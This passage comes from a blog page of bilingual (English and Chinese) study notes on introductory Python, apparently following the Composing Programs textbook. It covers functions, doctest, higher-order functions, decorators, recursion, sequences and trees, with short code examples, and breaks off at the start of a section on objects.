id="1-4-1-Documentation"><a href="#1-4-1-Documentation" class="headerlink" title="1.4.1 Documentation"></a>1.4.1 Documentation</h3><p>Dostring, using triple quoted. The first line describes the job of the function in one line. The following lines can describe arguments and clarify the behavior of the function. 这是制作<code>help</code>页，when you call <code>help</code> with the name of a function as an argument, you see its docstring.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">pressure</span>(<span class="hljs-params">v, t, n</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Compute the pressure in pascals of an ideal gas.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Applies the ideal gas law: http://en.wikipedia.org/wiki/Ideal_gas_law</span><br><span class="hljs-string"></span><br><span class="hljs-string">        v -- volume of gas, in cubic meters</span><br><span class="hljs-string">        t -- absolute temperature in degrees kelvin</span><br><span class="hljs-string">        n -- particles of gas</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        k = <span class="hljs-number">1.38e-23</span>  <span class="hljs-comment"># Boltzmann&#x27;s constant</span><br>        <span class="hljs-keyword">return</span> n * k * t / v<br></code></pre></td></tr></table></figure><p><mark>Comments</mark> use <code>#</code>.</p><h3 id="1-4-2-Default-Argument-Values"><a href="#1-4-2-Default-Argument-Values" class="headerlink" title="1.4.2 Default Argument Values"></a>1.4.2 Default Argument Values</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> pressure(v, t, n=<span class="hljs-number">6</span>.<span class="hljs-number">022</span>e23)<br></code></pre></td></tr></table></figure><h2 id="1-5-Control"><a href="#1-5-Control" class="headerlink" title="1.5 Control"></a>1.5 Control</h2><p>Python code is a sequence of statements.</p><p><mark>Practical Guidance</mark><br>When indenting a suite, all lines must be indented the same amount and in the same way(use spaces, not tabs). Any variation in indentation will cause an error.</p><h3 id="1-5-3-Defining-Functions-II-Local-Assignment"><a href="#1-5-3-Defining-Functions-II-Local-Assignment" class="headerlink" title="1.5.3 Defining Functions II: Local Assignment"></a>1.5.3 Defining Functions II: Local Assignment</h3><p>The process of function application terminates whenever the first <code>return</code> statement is excuted.</p><h3 id="1-5-4-Conditional-Statements"><a href="#1-5-4-Conditional-Statements" class="headerlink" title="1.5.4 Conditional Statements"></a>1.5.4 Conditional Statements</h3><p><mark>Conditional statements</mark></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">if</span> <span class="hljs-symbol">&lt;expression&gt;</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span><br>elif <span class="hljs-symbol">&lt;expression&gt;</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span><br><span class="hljs-keyword">else</span>:<br>     <span class="hljs-symbol">&lt;suite&gt;</span>]<br></code></pre></td></tr></table></figure><p>Python includes several false value, including 0, None, and the boolean value false.</p><p>The built-in comparison operations: &lt;, &gt;, &gt;&#x3D;, &lt;&#x3D;, &#x3D;&#x3D;, !&#x3D;.</p><p>Three basic logical operators are also built into Python: and, or, not.</p><p>Functions that perform comparisons and return boolean values typically begin with <code>is</code>.</p><h3 id="1-5-5-Iteration"><a href="#1-5-5-Iteration" class="headerlink" title="1.5.5 Iteration"></a>1.5.5 Iteration</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">while</span> <span class="hljs-symbol">&lt;expression&gt;</span>:<br>  <span class="hljs-symbol">&lt;suite&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-5-6-Testing"><a href="#1-5-6-Testing" class="headerlink" title="1.5.6 Testing"></a>1.5.6 Testing</h3><p><mark>Assertions</mark>. Programmers use <code>assert</code> statements to verify expectations, such as the output of a function being tested.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">assert</span> fib(<span class="hljs-number">8</span>) == <span class="hljs-number">13</span>, &#x27;The <span class="hljs-number">8</span>th Fibonacci number should be <span class="hljs-number">13</span>&#x27;<br></code></pre></td></tr></table></figure><p>如果为 false 则打印后面的 expression.</p><p><code>doctest</code> module. 利用 docstring 来测试.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sum_naturals</span>(<span class="hljs-params">n</span>):<br>      <span class="hljs-string">&quot;&quot;&quot;Return the sum of the first n natural numbers.</span><br><span class="hljs-string"></span><br><span class="hljs-string">      &gt;&gt;&gt; sum_naturals(10)</span><br><span class="hljs-string">      55</span><br><span class="hljs-string">      &gt;&gt;&gt; sum_naturals(100)</span><br><span class="hljs-string">      5050</span><br><span class="hljs-string">      &quot;&quot;&quot;</span><br>      total, k = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>      <span class="hljs-keyword">while</span> k &lt;= n:<br>          total, k = total + k, k + <span class="hljs-number">1</span><br>      <span class="hljs-keyword">return</span> total<br></code></pre></td></tr></table></figure><p>Starting Python with the doctest command line option:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest <span class="hljs-symbol">&lt;python_source_file&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-6-Higher-Order-Functions"><a href="#1-6-Higher-Order-Functions" class="headerlink" title="1.6 Higher-Order Functions"></a>1.6 Higher-Order Functions</h2><p>Functions that manipulate functions are called higher-order functions.</p><p>Frames which are no longer needed are removed to save space.</p><p>在函数被调用时才会创建 local frame.</p><h3 id="1-6-1-Functions-as-Arguments"><a href="#1-6-1-Functions-as-Arguments" class="headerlink" title="1.6.1 Functions as Arguments"></a>1.6.1 Functions as Arguments</h3><h3 id="1-6-2-Functions-as-General-Methods"><a href="#1-6-2-Functions-as-General-Methods" class="headerlink" title="1.6.2 Functions as General Methods"></a>1.6.2 Functions as General Methods</h3><h3 id="1-6-3-Defining-Functions-III-Nested-Definitions"><a href="#1-6-3-Defining-Functions-III-Nested-Definitions" class="headerlink" title="1.6.3 Defining Functions III: Nested Definitions"></a>1.6.3 Defining Functions III: Nested Definitions</h3><p>To place function definitions inside the body of other definitions:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt</span>(<span class="hljs-params">a</span>):<br>       <span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt_update</span>(<span class="hljs-params">x</span>):<br>           <span class="hljs-keyword">return</span> average(x, a/x)<br>       <span class="hljs-keyword">def</span> <span class="hljs-title function_">sqrt_close</span>(<span class="hljs-params">x</span>):<br>           <span class="hljs-keyword">return</span> approx_eq(x * x, a)<br>       <span class="hljs-keyword">return</span> improve(sqrt_update, sqrt_close)<br></code></pre></td></tr></table></figure><p><mark>Lexical scope</mark><br>A discipline of sharing names among nested definitions. The inner functions have access to the names in the environment where they are defined.</p><p>Two extensions to the environment model:<br>    - Each user-defined function has a parent environment: the environment in which it was defined<br>    - When a user-defined function is called, its local frame extends its parent environment.</p><h3 id="1-6-4-Functions-as-Returned-Values"><a href="#1-6-4-Functions-as-Returned-Values" class="headerlink" title="1.6.4 Functions as Returned Values"></a>1.6.4 Functions as Returned Values</h3><h3 id="1-6-5-Example-Newton’s-Method"><a href="#1-6-5-Example-Newton’s-Method" class="headerlink" title="1.6.5 Example: Newton’s Method"></a>1.6.5 Example: Newton’s Method</h3><h3 id="1-6-6-Currying"><a href="#1-6-6-Currying" class="headerlink" title="1.6.6 Currying"></a>1.6.6 Currying</h3><p>We can use higher-order function to convert a function that takes multiple arguments into a chain of functions that each take a single argument.</p><p>Currying is a transformation, like:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">curried_pow</span>(<span class="hljs-params">x</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">h</span>(<span class="hljs-params">y</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(x, y)<br>        <span class="hljs-keyword">return</span> h<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>curried_pow(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)<br><span class="hljs-number">8</span><br><br></code></pre></td></tr></table></figure><p><mark>Extended Environments</mark><br>An environment can consist of an arbitrarily long chain of frames, which always concludes with the global frame.</p><h3 id="1-6-7-Lambda-Expressions"><a href="#1-6-7-Lambda-Expressions" class="headerlink" title="1.6.7 Lambda Expressions"></a>1.6.7 Lambda Expressions</h3><p>匿名函数. 为了更简洁。</p><p>A lambda expression evaluates to a function that has a single return expression as its body. Assignment and control statements are not allowed.</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">lambda</span>            <span class="hljs-variable">x</span>            :          <span class="hljs-function"><span class="hljs-title">f</span>(<span class="hljs-title">g</span>(<span class="hljs-variable">x</span>))</span><br><span class="hljs-string">&quot;A function that    takes x    and returns     f(g(x))&quot;</span><br></code></pre></td></tr></table></figure><h3 id="1-6-8-Abstractions-and-First-Class-Functions"><a href="#1-6-8-Abstractions-and-First-Class-Functions" class="headerlink" title="1.6.8 Abstractions and First-Class Functions"></a>1.6.8 Abstractions and First-Class Functions</h3><h3 id="1-6-9-Function-Decorators"><a href="#1-6-9-Function-Decorators" class="headerlink" title="1.6.9 Function Decorators"></a>1.6.9 Function Decorators</h3><p>The decorator symbol <code>@</code>.</p><p><code>@</code> 后面跟一个 expression, this expression is evaluated first, the <code>def</code> statement second, and finally the result of evaluating the decorator expression is applied to the newly defined function, and the result if bound to the name in the <code>def</code> statement.</p><p>作用:</p><ol><li>使函数的功能得到补充，而同时不用修改函数本身的代码</li><li>增加函数执行前、后的行为，而不需对调用函数的代码做任何改变。</li></ol><p>感觉就是在当前函数的基础上添加功能。减少重复。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">trace</span>(<span class="hljs-params">fn</span>):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapped</span>(<span class="hljs-params">x</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-&gt; &#x27;</span>, fn, <span class="hljs-string">&#x27;(&#x27;</span>, x, <span class="hljs-string">&#x27;)&#x27;</span>)<br>            <span class="hljs-keyword">return</span> fn(x)<br>        <span class="hljs-keyword">return</span> wrapped<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>@trace<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">triple</span>(<span class="hljs-params">x</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">3</span> * x<br></code></pre></td></tr></table></figure><p>在调用<code>triple</code>时就会同时执行<code>trace</code>和<code>triple</code>中的内容。</p><h2 id="1-7-Recursive-Functions"><a href="#1-7-Recursive-Functions" class="headerlink" title="1.7 Recursive Functions"></a>1.7 Recursive Functions</h2><p>The operators <code>%</code> and <code>//</code> can be used to separate a number into two parts: its last digit and all but its last digit.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">18117</span> % <span class="hljs-number">10</span></span><br>7<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">18117</span> // <span class="hljs-number">10</span></span><br>1811<br></code></pre></td></tr></table></figure><p>The process of excuting the body of a recursive function may in turn require applying that function again.</p><h3 id="1-7-1-The-Anatomy-of-Recursive-Functions"><a href="#1-7-1-The-Anatomy-of-Recursive-Functions" class="headerlink" title="1.7.1 The Anatomy of Recursive Functions"></a>1.7.1 The Anatomy of Recursive Functions</h3><p>A common pattern: the body begins with a base case, a conditional statement that define the behavior of the function for the inputs that are simplest to process.</p><h3 id="1-7-2-Mutual-Recursion"><a href="#1-7-2-Mutual-Recursion" class="headerlink" title="1.7.2 Mutual Recursion"></a>1.7.2 Mutual Recursion</h3><p>A recursive procedure is divided among two functions that call each other.</p><h3 id="1-7-3-Printing-in-Recursive-Functions"><a href="#1-7-3-Printing-in-Recursive-Functions" class="headerlink" title="1.7.3 Printing in Recursive Functions"></a>1.7.3 Printing in Recursive Functions</h3><h3 id="1-7-4-Tree-Recursion"><a href="#1-7-4-Tree-Recursion" class="headerlink" title="1.7.4 Tree Recursion"></a>1.7.4 Tree Recursion</h3><p>A function with multiple recursive calls is said to be <mark>tree recursive</mark> because each call branches into multiple smaller calls, each of which branches into yes smaller calls, just as the branches of a tree become smaller but more numerous as they extend from the trunk.</p><h3 id="1-7-5-Example-Partitions"><a href="#1-7-5-Example-Partitions" class="headerlink" title="1.7.5 Example: Partitions"></a>1.7.5 Example: Partitions</h3><h2 id="Project-1-The-Game-of-Hog"><a href="#Project-1-The-Game-of-Hog" class="headerlink" title="Project 1: The Game of Hog"></a>Project 1: The Game of Hog</h2><h1 id="Champter-2-Building-Abstractions-with-Data"><a href="#Champter-2-Building-Abstractions-with-Data" class="headerlink" title="Champter 2: Building Abstractions with Data"></a>Champter 2: Building Abstractions with Data</h1><h2 id="2-1-Introduction"><a href="#2-1-Introduction" class="headerlink" title="2.1 Introduction"></a>2.1 Introduction</h2><h3 id="2-1-1-Native-Data-Types"><a href="#2-1-1-Native-Data-Types" class="headerlink" title="2.1.1 Native Data Types"></a>2.1.1 Native Data Types</h3><p>The built-in <code>type</code> function allows us inspect the class of any value.</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell">&gt;&gt;&gt; <span class="hljs-class"><span class="hljs-keyword">type</span>(2)</span><br>&lt;<span class="hljs-keyword">class</span> &#x27;int&#x27;&gt;<br></code></pre></td></tr></table></figure><p>Native data types have the following properties:</p><ol><li>There are expressions that evaluate to value of native types, called <code>literals</code></li><li>There are built-in functions and operators to manipulate values of native types.</li></ol><p>Python has three native numeric types: integers(int), real numbers(float), and complex numbers(complex).</p><p><code>int</code> objects represent integers exactly, without any approximation or limits on their size.</p><p><code>float</code> objects have minimum and maximum values.</p><h2 id="2-2-Data-Abstraction"><a href="#2-2-Data-Abstraction" class="headerlink" title="2.2 Data Abstraction"></a>2.2 Data Abstraction</h2><p>Data abstraction isolates how a compound data value is used from the details of how it is constructed.</p><h3 id="2-2-1-Example-Rational-Numbers"><a href="#2-2-1-Example-Rational-Numbers" class="headerlink" title="2.2.1 Example: Rational Numbers"></a>2.2.1 Example: Rational Numbers</h3><p>Dividing integers produces a <code>float</code> approximation, losing the exact precision of integers.</p><p>A powerful strategy for designing programs: wishful thinking.</p><h3 id="2-2-2-Pairs"><a href="#2-2-2-Pairs" class="headerlink" title="2.2.2 Pairs"></a>2.2.2 Pairs</h3><p>Python provides a compound structure called a <code>list</code>.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; <span class="hljs-selector-attr">[10, 20]</span><br><span class="hljs-selector-attr">[10, 20]</span><br></code></pre></td></tr></table></figure><p>Two ways to 使用 the elements in <code>list</code>:</p><ol><li>assignment, 赋值</li><li>element selection operator, 使用 index</li></ol><p>The equivalent function for element selection operator is called <code>getitem</code>.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> getitem</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">getitem(pair, <span class="hljs-number">0</span>)</span><br>10<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">getitem(pair, <span class="hljs-number">1</span>)</span><br>20<br></code></pre></td></tr></table></figure><h3 id="2-2-3-Abstraction-Barriers"><a href="#2-2-3-Abstraction-Barriers" class="headerlink" title="2.2.3 Abstraction Barriers"></a>2.2.3 Abstraction Barriers</h3><p>These functions are called by a higher level and implemented using a lower level of abstraction.</p><p>The fewer functions that depend on a particular representation, the fewer changes are required when one wants to change that representation. 也就是用函数去构建另一个函数.</p><h3 id="2-2-4-The-Properties-of-Data"><a href="#2-2-4-The-Properties-of-Data" class="headerlink" title="2.2.4 The Properties of Data"></a>2.2.4 The Properties of Data</h3><h2 id="2-3-Sequences"><a href="#2-3-Sequences" class="headerlink" title="2.3 Sequences"></a>2.3 Sequences</h2><p>Sequences is a collection of behavious that are shared among several different types of data.</p><ul><li>Length</li><li>Element selection</li></ul><h3 id="2-3-1-Lists"><a href="#2-3-1-Lists" class="headerlink" title="2.3.1 Lists"></a>2.3.1 Lists</h3><p>A list value is a sequence that can have arbitrary length.</p><p>The built-in <code>len</code> function returns the length of a sequence.</p><p>Lists can be added together and multiplied by integer:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; <span class="hljs-selector-attr">[2, 7]</span> + digits * <span class="hljs-number">2</span><br><span class="hljs-selector-attr">[2, 7, 1, 8, 2, 8, 1, 8, 2, 8]</span><br></code></pre></td></tr></table></figure><h3 id="2-3-2-Sequence-Iteration"><a href="#2-3-2-Sequence-Iteration" class="headerlink" title="2.3.2 Sequence Iteration"></a>2.3.2 Sequence Iteration</h3><p>The <code>for</code> statement:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">s, value</span>):<br>      <span class="hljs-string">&quot;&quot;&quot;Count the number of occurrences of value in sequence s.&quot;&quot;&quot;</span><br>      total = <span class="hljs-number">0</span><br>      <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> s:<br>          <span class="hljs-keyword">if</span> elem == value:<br>              total = total + <span class="hljs-number">1</span><br>      <span class="hljs-keyword">return</span> total<br><br></code></pre></td></tr></table></figure><p>The <name> will be bound to the last element of the sequence after the <code>for</code> statement is executed.</p><p>The pattern of binding multiple names to multiple values in a fixed-length sequence is called <code>sequence unpacking</code>:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;&gt;&gt; for <span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span> y in pairs:<br>      if <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> y:<br>          same_count <span class="hljs-operator">=</span> same_count + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>A <mark>range</mark> is another built-in type of sequence in Python, which represents a range of integers.</p><p>Ranges are created with <code>range</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)  <span class="hljs-comment"># Includes 1, but not 10</span><br><span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>Calling the <code>list</code> constructor on a range evaluates to a list:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">8</span>))</span><br>[5, 6, 7]<br></code></pre></td></tr></table></figure><p>A common convention is to use a single underscore character for the name in the <code>for</code> header if the name is unused in the suite:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">&gt;&gt;&gt; for _ in range(<span class="hljs-number">3</span>):<br>        print(<span class="hljs-string">&#x27;Go Bears!&#x27;</span>)<br><br>Go Bears!<br>Go Bears!<br>Go Bears!<br></code></pre></td></tr></table></figure><h3 id="2-3-3-Sequence-Processing"><a href="#2-3-3-Sequence-Processing" class="headerlink" title="2.3.3 Sequence Processing"></a>2.3.3 Sequence Processing</h3><p>List Comprehensions:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">odds = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">[x+<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> odds]</span><br>[2, 4, 6, 8, 10]<br></code></pre></td></tr></table></figure><p>The general form is:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">[<span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">expression</span>&gt;</span> for <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> in <span class="hljs-tag">&lt;<span class="hljs-name">sequence</span> <span class="hljs-attr">expression</span>&gt;</span> if <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">expression</span>&gt;</span>]<br></code></pre></td></tr></table></figure><p><mark>Aggregation</mark>, to aggregate all value in a sequence into a single value.<br><mark>Higher-Order Functions</mark><br><mark>Conventional Names</mark><br>In Python programs, it is more common to use list comprehension directly rather than higher-order functions, but both approaches to sequence processing are widely used.</p><h3 id="2-3-4-Sequence-Abstraction"><a href="#2-3-4-Sequence-Abstraction" class="headerlink" title="2.3.4 Sequence Abstraction"></a>2.3.4 Sequence Abstraction</h3><p><mark>Membership</mark>, A value can be tested for membership in a sequence. 就是看一个元素是否在 list 中. </p><p>Python has two operators <code>in</code> and <code>not in</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">digits</span><br>[1, 8, 2, 8]<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">2</span> <span class="hljs-keyword">in</span> digits</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">1828</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> digits</span><br>True<br></code></pre></td></tr></table></figure><p><mark>Slicing</mark>, sequences contain smaller sequences within them. 就是把 list 拆分.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt;&gt;&gt; digits<span class="hljs-selector-attr">[0:2]</span><br><span class="hljs-selector-attr">[1, 8]</span><br>&gt;&gt;&gt; digits<span class="hljs-selector-attr">[1:]</span><br><span class="hljs-selector-attr">[8, 2, 8]</span><br></code></pre></td></tr></table></figure><h3 id="2-3-5-Strings"><a href="#2-3-5-Strings" class="headerlink" title="2.3.5 Strings"></a>2.3.5 Strings</h3><p>The constructor <code>str</code>.</p><p>String literals are surrounded by either single or double quotation marks.</p><p>Strings have a length and they support element selection.</p><p>Like lists, strings can also be combined via addtion and multiplication:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"> &gt;&gt;&gt; <span class="hljs-string">&#x27;Berkeley&#x27;</span> + <span class="hljs-string">&#x27;, CA&#x27;</span><br><span class="hljs-string">&#x27;Berkeley, CA&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Shabu &#x27;</span> * <span class="hljs-number">2</span><br><span class="hljs-string">&#x27;Shabu Shabu &#x27;</span><br></code></pre></td></tr></table></figure><p><mark>Membership</mark>, it matches substrings rather than elements:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;here&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Where&#x27;s Waldo?&quot;</span><br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><mark>Multiple Literals</mark>, use triple quoting.<br><mark>String Coerction</mark>, a string can be created from any object in Python by calling the <code>str</code> constructor function.</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;&gt;&gt; <span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; is an element of &#x27;</span> + <span class="hljs-title">str</span>(<span class="hljs-variable">digits</span>)</span><br><span class="hljs-string">&#x27;2 is an element of [1, 8, 2, 8]&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-6-Trees"><a href="#2-3-6-Trees" class="headerlink" title="2.3.6 Trees"></a>2.3.6 Trees</h3><p>The data abstraction for a <code>tree</code> consists of the constructor <code>tree</code> and theselectors <code>label</code> and <code>branches</code>.</p><p>A tree is well-formed only if it has a root label and all branches are also trees.</p><p>The <code>type</code> function:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">if</span> <span class="hljs-keyword">type</span>(tree) != list or len(tree) &lt; 1:<br>          return <span class="hljs-type">False</span><br></code></pre></td></tr></table></figure><p><code>tree</code> 是 nested list, 第一个元素为 root&#x2F;label, 后面的为 branches.<br><mark>Patition trees</mark>, </p><h3 id="2-3-7-Linked-Lists"><a href="#2-3-7-Linked-Lists" class="headerlink" title="2.3.7 Linked Lists"></a>2.3.7 Linked Lists</h3><p>A linked list is a pair containing the first element of the sequence and the rest of the sequence. The second element is also a linked list.</p><p>Linked list have recursive structure: the rest of a linked list is a linked list or ‘empty’. 这个 ‘empty’ 是字符串 ‘empty’.</p><h2 id="2-4-Mutable-Data"><a href="#2-4-Mutable-Data" class="headerlink" title="2.4 Mutable Data"></a>2.4 Mutable Data</h2><p>One powerful technique for creating modular programs is to incorporate data that may change state over time.</p><p>Adding state to data is a central ingredient of a paradigm called object-oriented programming.</p><h3 id="2-4-1-The-Object-Metaphor"><a href="#2-4-1-The-Object-Metaphor" class="headerlink" title="2.4.1 The Object Metaphor"></a>2.4.1 The Object Metaphor</h3><p>The distinguish between functions and data: functions performed operations and data were operated upon.</p><p>Objects combine data values with behavior.</p><p>A class represents a kind of value. Individual dates are called instances of that class.</p><p>Objects have <mark>attributes</mark>, which are named values that are part of the object. We use dot notation to designated an attribute of an object.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span 